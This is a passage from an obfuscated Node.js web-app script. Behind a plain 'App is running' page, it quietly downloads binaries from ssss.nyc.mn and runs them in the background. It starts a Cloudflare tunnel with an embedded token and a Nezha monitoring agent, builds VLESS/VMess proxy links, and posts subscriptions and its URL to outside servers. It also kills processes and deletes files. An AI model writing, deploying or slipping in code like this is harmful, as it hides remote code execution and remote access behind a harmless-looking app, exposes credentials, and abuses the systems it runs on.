    '/config.json\x20>/dev/null\x202>&1\x20&',
    'substring',
    'win32',
    'finish',
    'Empowerment\x20success\x20for\x20',
    'Error\x20reading\x20boot.log:',
    'env',
    'Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!',
    'Download\x20',
    'PROJECT_URL',
    'existsSync',
    'readdirSync',
    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
    'freedom',
    'writeFileSync',
    'platform',
    'isFile',
    'Empowerment\x20failed\x20for\x20',
    'includes',
    '20jKpJyl',
    '/api/add-subscriptions',
    'firefox',
    'npm\x20running\x20error:\x20',
    '\x0a\x20\x20\x20\x20',
    'message',
    'arm',
    '&fp=firefox&type=ws&host=',
    'vless',
    'catch',
    'App\x20is\x20running',
    'get',
    'then',
    'https://arm64.ssss.nyc.mn/web',
    'error',
    '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20',
    'CFIP',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20',
    'send',
    'from',
    'axios',
    '\x0avless://',
    'del\x20/f\x20/q\x20',
    '178137cQGyYA',
    'AUTO_ACCESS',
    '2087',
    'split',
    'unshift',
    'pkill\x20-f\x20\x22[',
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiYWU2ZDIyN2MtMWRmZi00MjA2LWEyYWMtODI0MmRmNTZkMjdlIiwicyI6Ik1UQXlZalpsTnpjdFpEVTJZeTAwWm1OaExXRXpNemd0TVRFMll6Z3hZVFUwTkRWayJ9',
    'success',
    'toString',
    '180233cd-22c9-4144-a559-012e45986dd6',
    'taskkill\x20/f\x20/im\x20',
    'readFileSync',
    'NEZHA_KEY',
    'http\x20server\x20is\x20running\x20on\x20port:',
    'readFile',
    'Subscription\x20uploaded\x20successfully',
    '443',
    '&path=%2Fvless-argo%3Fed%3D2560#',
    '8443',
    '.exe\x20>\x20nul\x202>&1',
    'fileName',
    'automatic\x20access\x20task\x20added\x20successfully',
    'list.txt',
    'ARGO_DOMAIN',
    'fileUrl',
    '\x20failed:\x20',
    '\x20>/dev/null\x202>&1',
    'https://oooo.serv00.net/add-url',
    '2083',
    'data',
    '\x20-c\x20\x22',
    'utf-8',
    '\x22\x20>\x20/dev/null\x202>&1',
    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
    'Unhandled\x20error\x20in\x20startserver:',
    'path',
    '\x0a\x0avmess://',
    'Unknown',
    '2053',
    'nohup\x20',
    'Error\x20in\x20startserver:',
    '/api/add-nodes',
    'Add\x20automatic\x20access\x20task\x20faild:\x20',
    'https://amd64.ssss.nyc.mn/agent',
    'country_code',
    '2238148pkVkTC',
    'Content-Type',
    '\x20already\x20exists'
  ]
  _0x372c = function () {
    return _0x3671cc
  }
  return _0x372c()
}
async function AddVisitTask() {
  const _0x2c29fc = _0x41a7ba
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console[_0x2c29fc(0xa2)](_0x2c29fc(0xa5))
    return
  }
  try {
    const _0x49f0b8 = await axios[_0x2c29fc(0x6e)](_0x2c29fc(0x11d), { url: PROJECT_URL }, { headers: { 'Content-Type': _0x2c29fc(0x97) } })
    return (console['log'](_0x2c29fc(0x117)), _0x49f0b8)
  } catch (_0x2ff053) {
    return (console['error'](_0x2c29fc(0x12c) + _0x2ff053[_0x2c29fc(0xf0)]), null)
  }
}
async function startserver() {
  const _0x1408f3 = _0x41a7ba
  try {
    ;(argoType(), deleteNodes(), cleanupOldFiles(), await generateConfig(), await downloadFilesAndRun(), await extractDomains(), await AddVisitTask())
  } catch (_0x394123) {
    console['error'](_0x1408f3(0x12a), _0x394123)
  }
}
;(startserver()[_0x41a7ba(0xf4)]((_0x223fed) => {
  const _0x2ecac3 = _0x41a7ba
  console['error'](_0x2ecac3(0x124), _0x223fed)
}),
  app[_0x41a7ba(0xf6)]('/', async function (_0x585ca1, _0x49c917) {
    const _0x2bafab = _0x41a7ba
    try {
      const _0x94a2db = path[_0x2bafab(0x6f)](__dirname, _0x2bafab(0xc0)),
        _0x50f889 = await fs[_0x2bafab(0x78)][_0x2bafab(0x110)](_0x94a2db, _0x2bafab(0xd4))
      _0x49c917[_0x2bafab(0xfd)](_0x50f889)
    } catch (_0x47aa08) {
      _0x49c917[_0x2bafab(0xfd)](_0x2bafab(0xdd))
    }
  }),
  app['listen'](PORT, () => console['log'](_0x41a7ba(0x10f) + PORT + '!')))
